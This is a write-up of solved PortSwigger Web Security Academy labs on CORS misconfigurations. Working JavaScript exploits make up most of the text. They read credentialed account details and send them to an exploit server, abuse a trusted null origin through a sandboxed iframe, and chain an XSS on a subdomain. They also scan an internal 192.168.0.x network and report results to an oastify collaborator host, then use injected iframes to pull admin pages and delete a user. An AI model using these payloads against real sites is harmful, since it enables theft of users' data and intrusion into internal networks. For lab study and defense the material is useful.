# Title: Cross origin resource sharing , *Web Academy*
- 👨‍💻By: Nathan Hailu
- 🗒Description: Labs are solved and their write up is here.
- 📅Date: Mon 12/12/2022

================= { START } ==============================

> You try cors if u have seen "Access-Control-Allow-Credentials: true" this kinda response headers!

A) **CORS vulnerability with basic origin reflection**

    When we try to test CORS we will see the response if it contains the acess-control-allow-origin or acess-control-allow-credentials header. if it have that we will try to use the origin header on the request and try to see if he pass or block it. if it pass we can exploit it with some CORS POC scripts
       
                <script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
            req.withCredentials = true;
            req.send();

            function reqListener() {
                location='/log?key='+this.responseText;
            };
            </script>


B) **CORS vulnerability with trusted null origin**

    Thanks to developers they have forgoted 'null' by whitelisting it for local work. so first, we will try to add origin: example.con then we will try origin: * but when we try origin: null  it will responde with so Access-Control-Allow-Origin: null boom! we just need to run CORS POC script.

                <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
            req.withCredentials = true;
            req.send();
            function reqListener() {
                location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
            };
            </script>"></iframe>

C) **CORS vulnerability with trusted insecure protocols**

    TO detect we can try different methods.
            1, origin: *
            2, origin: https://attacker.com
            3, origin: null
            4, origin: https://attacker.OriginalURL.com
            5, origin: https://OriginalURL.com.attacker.com
            
        These things have to give {
            Access-Control-Allow-Origin: https://attacker.OriginalURL.com
            Access-Control-Allow-Credentials: true
        }
    on this lab when we try all they wont work except the method 4, there for we will try to find a subdomain, for that you can use tools, also you can check the site endpoints.
    finally, you will get stock.webacademy.com domain so we will try any open vuln on it if the site have some vuln like xss, we will craft our JS code like below.

    <script>
    document.location="http://stock.0a55009e038cde09c07b54ee00230042.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a55009e038cde09c07b54ee00230042.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a13006e037fdecbc0ae53ee0174000f.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
    </script>

D) **CORS vulnerability with internal network pivot attack**

>    **1) Find the Vulnerable site on the local system(intranet) with port 8080**.
        so we will try to bruteforce and get the working ip.

        **CODE**:
            <script>
                var q = [], collaboratorURL = 'http://$collaboratorPayload';

                for(i=1;i<=255;i++) {
                    q.push(function(url) {
                        return function(wait) {
                            fetchUrl(url, wait);
                        }
                    }('http://192.168.0.'+i+':8080'));
                }

                for(i=1;i<=20;i++){
                    if(q.length)q.shift()(i*100);
                }

                function fetchUrl(url, wait) {
                    var controller = new AbortController(), signal = controller.signal;
                    fetch(url, {signal}).then(r => r.text().then(text => {
                        location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
                    }))
                    .catch(e => {
                        if(q.length) {
                            q.shift()(wait);
                        }
                    });
                    setTimeout(x => {
                        controller.abort();
                        if(q.length) {
                            q.shift()(wait);
                        }
                    }, wait);
                }
            </script>

        RESULT:
            ip = 192.168.0.14:8080
            content: 
            !DOCTYPE html>
            <html>
                <head>
                    <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
                    <link href=/resources/css/labs.css rel=stylesheet>
                    <title>CORS vulnerability with internal network pivot attack</title>
                </head>
                <body>
                        <script src="/resources/labheader/js/labHeader.js"></script>
                        <div id="academyLabHeader">
                <section class='academyLabBanner'>
                    <div class=container>
                        <div class=logo></div>
                            <div class=title-container>
                                <h2>CORS vulnerability with internal network pivot attack</h2>
                                <a id='exploit-link' class='button' target='_blank' href='http://exploit-0afd000d03db28c6c3f42d6c018b00c3.exploit-server.net'>Go to exploit server</a>
                                <a class=link-back href='https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack'>
                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                        <g>
                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                        </g>
                                    </svg>
                                </a>
                            </div>
                            <div class='widgetcontainer-lab-status is-notsolved'>
                                <span>LAB</span>
                                <p>Not solved</p>
                                <span class=lab-status-icon></span>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
                    <div theme="">
                        <section class="maincontainer">
                            <div class="container is-page">
                                <header class="navigation-header">
                                    <section class="top-links">
                                        <a href=/>Home</a><p>|</p>
                                        <a href="/my-account">My account</a><p>|</p>
                                    </section>
                                </header>
                                <header class="notification-header">
                                </header>
                                <h1>Login</h1>
                                <section>
                                    <form class=login-form method=POST action=/login>
                                        <input required type="hidden" name="csrf" value="d6kVjRyUNYuTjNiJAl7kAU3nBlKrmbvn">
                                        <label>Username</label>
                                        <input required type=username name="username">
                                        <label>Password</label>
                                        <input required type=password name="password">
                                        <button class=button type=submit> Log in </button>
                                    </form>
                                </section>
                            </div>
                        </section>
                    </div>
                </body>
            </html>
            &1671166483633 HTTP/1.1

>    **2) Tried to Get XSS vulnerability on the ip we got, username field is vulnerable to XSS**
        
        CODE: 
            <script>
                function xss(url, text, vector) {
                    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
                }

                function fetchUrl(url, collaboratorURL){
                    fetch(url).then(r => r.text().then(text => {
                        xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
                    }))
                }

                fetchUrl("http://192.168.0.14:8080", "http://jqd0vjc11av4h8vxudghtypl2c83ws.oastify.com");
            </script>
            
        RESULT: ?foundXSS=1

>    **3) try to exploit the admin page with the XSS**

        CODE: 
            <script>
                function xss(url, text, vector) {
                    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
                }

                function fetchUrl(url, collaboratorURL){
                    fetch(url).then(r=>r.text().then(text=>
                    {
                        xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
                    }
                    ))
                }

                fetchUrl("http://$ip", "http://$collaboratorPayload");
            </script>

        RESULT:
            
                <script src="/resources/labheader/js/labHeader.js"></script>
                <div id="academyLabHeader">
        <section class="academyLabBanner">
            <div class="container">
                <div class="logo"></div>
                    <div class="title-container">
                        <h2>CORS vulnerability with internal network pivot attack</h2>
                        <a id="exploit-link" class="button" target="_blank" href="http://exploit-0afd000d03db28c6c3f42d6c018b00c3.exploit-server.net">Go to exploit server</a>
                        <a class="link-back" href="https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack">
                            Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                            <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 28 30" enable-background="new 0 0 28 30" xml:space="preserve" title="back-arrow">
                                <g>
                                    <polygon points="1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15"></polygon>
                                    <polygon points="14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15"></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                    <div class="widgetcontainer-lab-status is-notsolved">
                        <span>LAB</span>
                        <p>Not solved</p>
                        <span class="lab-status-icon"></span>
                    </div>
                </div>
            </section></div>
        

            <div theme="">
                <section class="maincontainer">
                    <div class="container is-page">
                        <header class="navigation-header">
                            <section class="top-links">
                                <a href="/">Home</a><p>|</p>
                                <a href="/admin">Admin panel</a><p>|</p>
                                <a href="/my-account?id=administrator">My account</a><p>|</p>
                            </section>
                        </header>
                        <header class="notification-header">
                        </header>
                        <form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
                            <input required="" type="hidden" name="csrf" value="hADU9ssaK96KP1hBx4Se5zNgndx2Tpfu">
                            <label>Username</label>
                            <input required="" type="text" name="username">
                            <button class="button" type="submit">Delete user</button>
                        </form>
                    </div>
                </section>
            </div>
        

    HTTP/1.1

>    **4) Delete the carlos account. because we have got authenticated page on step 3.**

       CODE:
            <script>
                function xss(url, text, vector) {
                    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
                }

                function fetchUrl(url){
                    fetch(url).then(r=>r.text().then(text=>
                    {
                    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
                    }
                    ))
                }

                fetchUrl("http://192.168.0.14:8080");
            </script>
        
        RESULT:
            THE CARLOS ACCOUNT WILL BE DELETED and lab will be solved!